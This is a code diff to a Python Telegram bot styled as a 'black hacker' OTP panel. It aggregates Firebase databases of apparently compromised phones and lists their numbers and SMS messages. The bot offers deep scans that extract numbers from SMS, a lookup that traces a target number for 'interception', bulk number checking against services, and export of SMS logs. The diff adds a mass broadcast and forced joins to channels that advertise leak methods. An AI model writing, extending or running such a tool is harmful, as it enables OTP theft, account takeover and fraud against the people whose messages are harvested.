@@ -2,8 +2,8 @@
 """
 ══════════════════════════════════════════════════════
   ☠️ OTP PANEL BOT — BLACK HACKER EDITION ☠️
-  Live Incremental Counter | UI Bug Fixed (HTML)
-  Memory Optimized | Ghost Workers Alive
+  Admin Panel Fixed | Universal Broadcast Added
+  Strict Force-Join | Memory Optimized (Railway)
 ══════════════════════════════════════════════════════
 """
 
@@ -55,6 +55,7 @@ ADMIN_IDS: set[int] = {
     6860106371,   
 }
 
+# 🔥 STRICT FORCE JOIN CHANNELS
 FORCE_JOIN_CHATS = [
     "@sabkijayhokhush", 
     "@leakmethodfree", 
@@ -276,13 +277,16 @@ def is_spamming(user_id: int) -> bool:
     user_cooldowns[user_id] = now
     return False
 
+# 🔥 STRICT PERMANENT FORCE JOIN CHECKER
 async def check_force_join(bot, user_id: int) -> bool:
     if user_id in ADMIN_IDS: return True
     for chat in FORCE_JOIN_CHATS:
         try:
             member = await bot.get_chat_member(chat, user_id)
-            if member.status in ['left', 'kicked', 'banned']: return False
-        except: pass
+            if member.status in ['left', 'kicked', 'banned']: 
+                return False
+        except Exception as e: 
+            return False
     return True
 
 async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -411,14 +415,13 @@ def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
         [KeyboardButton("👥 Syndicate (VIP)"), KeyboardButton("📖 Hacker Manual")]
     ]
     if is_admin:
-        keys.append([KeyboardButton("Admin Panel"), KeyboardButton("Super Admin")])
+        keys.append([KeyboardButton("Admin Panel")]) # 🔥 FIXED ADMIN BUTTON
     return ReplyKeyboardMarkup(keys, resize_keyboard=True)
 
 def device_label(d: Device) -> str:
     if d.numbers: return " & ".join(d.numbers)
     return f"{d.name} ({d.id[:8]})"
 
-# 🔥 FIXED: Using <b> instead of ** for zero UI bugs!
 def device_list_header(devices: list[Device], page: int = 0) -> str:
     online  = sum(1 for d in devices if d.status == "online")
     offline = len(devices) - online
@@ -588,11 +591,10 @@ def admin_panel_text(bot_token: str) -> str:
 
 def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
     keys = [
-        [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
-        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
-        [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
-        [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
-        [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
+        [InlineKeyboardButton("📡 Broadcast Message", callback_data="sa_broadcast")], # 🔥 NEW BROADCAST BUTTON
+        [InlineKeyboardButton("➕ Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("👀 View User Panels", callback_data="sa_view_user_panels")],
+        [InlineKeyboardButton("💾 Export Online Numbers", callback_data="sa_export_numbers"), InlineKeyboardButton("📥 Download Logs", callback_data="sa_download_logs")],
+        [InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"), InlineKeyboardButton("❌ Close", callback_data="close_msg")]
     ]
     return InlineKeyboardMarkup(keys)
 
@@ -700,7 +702,6 @@ async def _update_global_cache():
     scan_progress["scanned"] = 0
     scan_progress["is_scanning"] = True
     
-    # 🔥 LIVE INCREMENTAL SYNC FOR THE FIRST BOOT! No more 0 dropping.
     is_first_run = len(GLOBAL_DEVICE_CACHE.get("ALL", [])) == 0
 
     for i in range(0, len(items), CHUNK_SIZE):
@@ -853,6 +854,12 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             try: await query.message.delete()
             except: pass
             await ctx.bot.send_message(chat_id, "❌ <b>MISSION ABORTED.</b> Background process killed.", parse_mode="HTML")
+            return
+
+        # 🔥 BROADCAST HANDLER
+        if data == "sa_broadcast":
+            pending_action[chat_id] = {"action": "sa_broadcast"}
+            await safe_edit(query, "📡 <b>BROADCAST SYSTEM INITIATED</b>\n━━━━━━━━━━━━━━━━━━\nSend the message, photo, or video you want to broadcast to ALL users.\n\n<i>Press Cancel to abort</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_action")]]), parse_mode="HTML")
             return
 
         if data.startswith("wish:"):
@@ -1213,40 +1220,72 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     except: pass
 
 # ═══════════════════════════════════════════════════════
-#  TEXT MESSAGE HANDLER
+#  TEXT MESSAGE / BROADCAST HANDLER
 # ═══════════════════════════════════════════════════════
 
-async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     try:
         chat_id = update.effective_chat.id
-        text    = (update.message.text or "").strip()
+        user_id = update.effective_user.id
         bot_token = ctx.bot.token
         users_db = all_users
         
-        if not await check_force_join(ctx.bot, chat_id):
+        # 🔥 STRICT PERMANENT FORCE JOIN SHIELD
+        if not await check_force_join(ctx.bot, user_id):
             join_kb = InlineKeyboardMarkup([
                 [InlineKeyboardButton("Join Channel 1", url="https://t.me/sabkijayhokhush")],
                 [InlineKeyboardButton("Join Channel 2", url="https://t.me/leakmethodfree")],
                 [InlineKeyboardButton("Join Group", url="https://t.me/rosekhudkabanaya")],
                 [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
             ])
-            await update.message.reply_text("⚠️ <b>UNAUTHORIZED ACCESS</b>\n\nTerminal locked. Join all syndicate channels to authenticate.", reply_markup=join_kb, parse_mode="HTML")
+            await update.message.reply_text("⚠️ <b>ACCESS DENIED: SYNDICATE LOCK</b>\n\nTerminal locked indefinitely. Join all syndicate channels to authenticate.", reply_markup=join_kb, parse_mode="HTML")
             return
 
-        if is_spamming(chat_id): return
+        if is_spamming(user_id): return
+
+        state = pending_action.get(chat_id)
+        action = state.get("action") if state else None
+
+        # 🔥 UNIVERSAL BROADCAST SYSTEM (Supports Text/Photo/Video)
+        if action == "sa_broadcast" and chat_id in ADMIN_IDS:
+            pending_action.pop(chat_id, None)
+            users_list = list(all_users.keys())
+            wait_msg = await update.message.reply_text(f"🚀 <b>BROADCAST INITIATED</b>\nTargeting {len(users_list)} devices...", parse_mode="HTML")
+            
+            success, failed = 0, 0
+            for uid in users_list:
+                try:
+                    await ctx.bot.copy_message(chat_id=uid, from_chat_id=chat_id, message_id=update.message.message_id)
+                    success += 1
+                    await asyncio.sleep(0.05) # Safe delay to prevent Telegram flood bans
+                except:
+                    failed += 1
+            
+            await wait_msg.edit_text(f"✅ <b>BROADCAST COMPLETE</b>\n━━━━━━━━━━━━━━━━━━\n🟢 Success: {success}\n🔴 Failed (Blocked bot): {failed}", parse_mode="HTML")
+            return
+
+        text = (update.message.text or update.message.caption or "").strip()
+        if not text: return # Ignore non-text messages if not broadcasting
+
+        if text in ["Admin Panel", "Super Admin"] and chat_id in ADMIN_IDS:
+            kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton("📡 Broadcast Message", callback_data="sa_broadcast")],
+                [InlineKeyboardButton("➕ Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("👀 View User Panels", callback_data="sa_view_user_panels")],
+                [InlineKeyboardButton("💾 Export Online Numbers", callback_data="sa_export_numbers"), InlineKeyboardButton("📥 Download Logs", callback_data="sa_download_logs")],
+                [InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"), InlineKeyboardButton("❌ Close", callback_data="close_msg")]
+            ])
+            await update.message.reply_text("☠️ <b>SUPER ADMIN CONSOLE</b>\nChoose override parameter:", reply_markup=kb, parse_mode="HTML")
+            return
 
         if text == "📱 Devices List":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action.pop(chat_id, None)
-            
             devices = await get_all_devices(bot_token, chat_id, users_db)
-            
             if not devices:
                 if scan_progress.get("is_scanning", False):
                     scanned = scan_progress.get("scanned", 0)
                     total = scan_progress.get("total", 1)
                     pct = int((scanned / max(total, 1)) * 100)
-                    
                     msg = (
                         f"⏳ <b>Bypassing Firewalls (Live Scan)</b>\n\n"
                         f"Establishing connections with Global Network...\n"
@@ -1257,7 +1296,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 else:
                     await update.message.reply_text("❌ Zero active nodes detected. Inject Custom Panels or upgrade to VIP.")
                 return
-                
             await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
             return
 
@@ -1266,27 +1304,18 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             uinfo = users_db.get(chat_id, {})
             is_vip = uinfo.get("vip_until", 0) > time.time()
             is_admin = chat_id in ADMIN_IDS
-            
             if not (is_vip or is_admin):
                 await update.message.reply_text("⛔ <b>ACCESS DENIED: INSUFFICIENT REP</b>\n\nElite Vault is restricted to Syndicate VIPs. Get 20 Referrals to unlock.", parse_mode="HTML")
                 return
-                
             wishlist = uinfo.get("wishlist", [])
             if not wishlist:
                 await update.message.reply_text("📭 Your Elite Vault is empty. Go to any Device Info and click '🖤 Add Panel to Vault'.")
                 return
-                
             await update.message.reply_text("⏳ Unlocking Elite Vault...\nDecrypting your private liked panels...")
-            
-            vault_devices = []
-            for d in GLOBAL_DEVICE_CACHE.get("ALL", []):
-                if d.base_url in wishlist:
-                    vault_devices.append(d)
-                    
+            vault_devices = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.base_url in wishlist]
             if not vault_devices:
                 await update.message.reply_text("❌ All panels in your Vault are currently DEAD/Offline.")
                 return
-                
             await update.message.reply_text(device_list_header(vault_devices, 0), reply_markup=device_list_keyboard(vault_devices, 0), parse_mode="HTML")
             return
 
@@ -1312,7 +1341,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             ref_count = uinfo.get("referrals", 0)
             bot_user = await ctx.bot.get_me()
             ref_link = f"https://t.me/{bot_user.username}?start=ref_{chat_id}"
-            
             msg = (
                 "🎁 <b>SYNDICATE REP SYSTEM</b>\n━━━━━━━━━━━━━━━━━━\n"
                 f"👤 <b>Your Rep:</b> {ref_count} / 20 Targets\n\n"
@@ -1342,13 +1370,11 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if not dbs:
                 await update.message.reply_text("Your private network is empty.")
                 return
-                
             kb = []
             for i, db in enumerate(dbs):
                 url_str = db if isinstance(db, str) else db.get("url", "")
                 kb.append([InlineKeyboardButton(f"❌ Drop: {url_str[:25]}...", callback_data=f"del_panel:{i}")])
             kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
-            
             await update.message.reply_text("🗑 <b>Drop Private Panels</b>\nSelect a node to disconnect from your network:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
             return
 
@@ -1356,17 +1382,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action[chat_id] = {"action": "set_personal_db"}
             await update.message.reply_text("➕ <b>INJECT PRIVATE PANELS</b>\n━━━━━━━━━━━━━━━━━━\nSend Firebase URL(s). System will automatically parse payloads.\n\nCancel: /cancel", parse_mode="HTML")
-            return
-
-        if text == "Super Admin" and chat_id in ADMIN_IDS:
-            kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
-                [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
-                [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
-                [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
-                [InlineKeyboardButton("Close", callback_data="close_msg")]
-            ])
-            await update.message.reply_text("SUPER ADMIN CONSOLE\nChoose override parameter:", reply_markup=kb)
             return
 
         if text == "🦇 Deep Scan":
@@ -1378,16 +1393,12 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 user_focus.setdefault(bot_token, {}).pop(chat_id, None)
                 pending_action[chat_id] = {"action": "scanning_hidden"}
                 wait_msg = await update.message.reply_text("🦇 Initiating Deep Scan for Ghost Nodes...\n\nBypassing registry, please wait...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]))
-                
                 devices = await get_all_devices(bot_token, chat_id, users_db)
                 if chat_id not in pending_action: return 
-
                 target_devices = [d for d in devices if not d.numbers]
-                
                 if not target_devices:
                     await wait_msg.edit_text("All nodes are cleanly indexed. No Ghost Nodes found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                     return
-                    
                 results = []
                 kb = []
                 phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
@@ -1402,18 +1413,14 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                         matches = phone_pattern.findall(body)
                         for m in matches:
                             found_nums.add(m)
-                            if not sample_sms:
-                                sample_sms = body[:40].replace('\n', ' ') + "..."
+                            if not sample_sms: sample_sms = body[:40].replace('\n', ' ') + "..."
                     if found_nums:
                         found_count += 1
                         results.append(f"Ghost Node: {d.name} ({d.id[:6]})\nExtracted: {', '.join(found_nums)}\nPacket: {sample_sms}\n")
-                        if len(kb) < 90: 
-                            kb.append([InlineKeyboardButton(f"Extract: {list(found_nums)[0][:5]}...", callback_data=f"msgs:{d.id}")])
-                            
+                        if len(kb) < 90: kb.append([InlineKeyboardButton(f"Extract: {list(found_nums)[0][:5]}...", callback_data=f"msgs:{d.id}")])
                 if found_count == 0:
                     await wait_msg.edit_text("Deep scan finished. No active Ghost Nodes in 24h.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                     return
-                    
                 kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
                 results_text = "🦇 DEEP SCAN RESULTS\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(results)
                 if len(results_text) > 4000: results_text = results_text[:4000] + "\n\n...[Data Truncated]"
@@ -1428,10 +1435,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await update.message.reply_text("No active process.")
             return
 
-        state = pending_action.get(chat_id)
-        if not state: return
-
-        action = state.get("action")
+        if not action: return
         
         if action == "search_live_number":
             pending_action.pop(chat_id)
@@ -1439,15 +1443,12 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if len(clean_search) < 10:
                 await update.message.reply_text("❌ Invalid MSISDN structure.")
                 return
-                
             wait_msg = await update.message.reply_text(f"⏳ Pinging databases for <code>+{clean_search}</code>...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort", callback_data="cancel_action")]]), parse_mode="HTML")
             all_devices = await get_all_devices(bot_token, chat_id, users_db)
             found_devs = [d for d in all_devices if any(clean_search in num for num in d.numbers) and d.status == "online"]
-            
             if not found_devs:
                 await wait_msg.edit_text(f"📭 Target <code>+{clean_search}</code> offline.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
                 return
-                
             rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:10]]
             rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
             await wait_msg.edit_text(f"🔍 <b>Target Traced:</b> <code>+{clean_search}</code>\nSelect below to intercept:", reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")
@@ -1457,29 +1458,23 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if HEAVY_TASK_LIMITER.locked():
                 await update.message.reply_text("⚠️ <b>Network Congestion!</b>\nTry again in 60 seconds.", parse_mode="HTML")
                 return
-
             async with HEAVY_TASK_LIMITER:
                 raw_nums = re.sub(r"\D", " ", text).split()
                 target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
                 if not target_nums:
                     await update.message.reply_text("❌ Invalid input!")
                     return
-                
                 service = state["service"]
                 pending_action.pop(chat_id)
                 pending_action[chat_id] = {"action": "bulk_checking"}
-                
                 if len(target_nums) == 1:
                     number = target_nums[0]
                     wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Exploiting {number}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort", callback_data="cancel_action")]]))
                     res = await check_number_api(service, number)
-                    
                     is_error = res.get("status") == "error"
                     ms = res.get("ms", 0)
                     is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
-                    
                     res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
-                    
                     kb = []
                     if not is_reg and not is_error:
                         kb.append([InlineKeyboardButton("🔍 Trace Target on Network", callback_data=f"search_num:{number}")])
@@ -1488,17 +1483,14 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 else:
                     total_bulk = len(target_nums)
                     wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Injecting {total_bulk} targets on {service.capitalize()}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]))
-                    
                     bulk_results = []
                     registered_list = []
                     BATCH_SIZE = 100 
-                    
                     for i in range(0, total_bulk, BATCH_SIZE):
                         if chat_id not in pending_action: return 
                         batch = target_nums[i:i+BATCH_SIZE]
                         tasks = [check_number_api(service, num) for num in batch]
                         res_list = await asyncio.gather(*tasks, return_exceptions=True)
-                        
                         for num, res in zip(batch, res_list):
                             if isinstance(res, Exception) or res.get("status") == "error":
                                 bulk_results.append(f"❌ <code>{num}</code> - Error")
@@ -1506,19 +1498,13 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                             is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                             stat = "Reg" if is_reg else "UNREG"
                             bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {stat}")
-                            if is_reg:
-                                registered_list.append(num)
-                            
+                            if is_reg: registered_list.append(num)
                         await asyncio.sleep(0.5)
-                    
                     if chat_id not in pending_action: return 
                     res_text = f"<b>📊 BULK INJECT RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
-                    if len(res_text) > 4000:
-                        res_text = res_text[:4000] + "\n...[Truncated]"
-                        
+                    if len(res_text) > 4000: res_text = res_text[:4000] + "\n...[Truncated]"
                     kb = [[InlineKeyboardButton("🔄 Inject Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("💻 Main Terminal", callback_data="open_checker_menu")]]
                     await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
-                    
                     if registered_list and chat_id in ADMIN_IDS:
                         file_name = f"Registered_{service.upper()}_Bulk.txt"
                         file_path = os.path.join(SYS_DIR, file_name)
@@ -1535,7 +1521,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if not firebase_urls:
                 await update.message.reply_text("Invalid payload structure.")
                 return
-                
             global_list = SETTINGS.get("global_panels", [])
             global_list.extend(firebase_urls)
             SETTINGS["global_panels"] = global_list
@@ -1546,18 +1531,14 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if action == "set_personal_db":
             urls = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
             firebase_urls = [u for u in urls if 'firebaseio.com' in u or 'firebasedatabase.app' in u]
-            
             if not firebase_urls:
                 await update.message.reply_text("❌ Invalid Input!")
                 return
-                
             pending_action.pop(chat_id)
             expiry_time = time.time() + (86400 * 365) 
-            
             for custom_url in firebase_urls:
                 new_entry = {"url": custom_url, "expiry": expiry_time}
                 users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append(new_entry)
-                
             save_user(chat_id)
             await update.message.reply_text(f"✅ {len(firebase_urls)} Private Nodes Connected!\n\nOpen 'Devices List' to ping your network.", reply_markup=get_reply_menu(chat_id))
             return
@@ -1615,6 +1596,22 @@ async def fetch_device_data_task(tag: str, url: str, results_list: list):
     finally:
         scan_progress["scanned"] += 1
 
+def process_devices_list(raw_list):
+    unique_devices = []
+    seen_ids_cache = set()
+    seen_numbers = set()
+    for d in raw_list:
+        if d.id in seen_ids_cache: continue
+        seen_ids_cache.add(d.id)
+        if d.numbers:
+            new_nums = [num for num in d.numbers if num not in seen_numbers]
+            if not new_nums: continue 
+            d.numbers = new_nums
+            seen_numbers.update(new_nums)
+        unique_devices.append(d)
+    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
+    return unique_devices
+
 async def _update_global_cache():
     global scan_progress
     dbs_to_poll = dict(DATABASES)
@@ -1641,35 +1638,12 @@ async def _update_global_cache():
         tasks = [fetch_device_data_task(tag, url, all_devices_gathered) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
         
-        # 🔥 PUSH LIVE UPDATES IMMEDIATELY ON FIRST RUN
         if is_first_run:
-            unique_devices = []
-            seen_ids_cache = set()
-            for d in all_devices_gathered:
-                if d.id in seen_ids_cache: continue
-                seen_ids_cache.add(d.id)
-                unique_devices.append(d)
-            unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
-            GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
+            GLOBAL_DEVICE_CACHE["ALL"] = process_devices_list(all_devices_gathered)
             
         await asyncio.sleep(0.5) 
         
-    unique_devices = []
-    seen_ids_cache = set()
-    seen_numbers = set()
-
-    for d in all_devices_gathered:
-        if d.id in seen_ids_cache: continue
-        seen_ids_cache.add(d.id)
-        if d.numbers:
-            new_nums = [num for num in d.numbers if num not in seen_numbers]
-            if not new_nums: continue 
-            d.numbers = new_nums
-            seen_numbers.update(new_nums)
-        unique_devices.append(d)
-
-    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
-    GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
+    GLOBAL_DEVICE_CACHE["ALL"] = process_devices_list(all_devices_gathered)
     scan_progress["is_scanning"] = False
 
 async def global_cache_loop():
@@ -1847,7 +1821,7 @@ def main() -> None:
     app.add_handler(CommandHandler("start",   cmd_start))
     app.add_handler(CommandHandler("admin",   cmd_admin))
     app.add_handler(CallbackQueryHandler(on_callback))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
+    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, on_message)) # 🔥 UPDATED TO HANDLE PHOTOS/VIDEOS FOR BROADCAST
     app.add_error_handler(global_error_handler)
 
     async def post_init(application: Application) -> None:
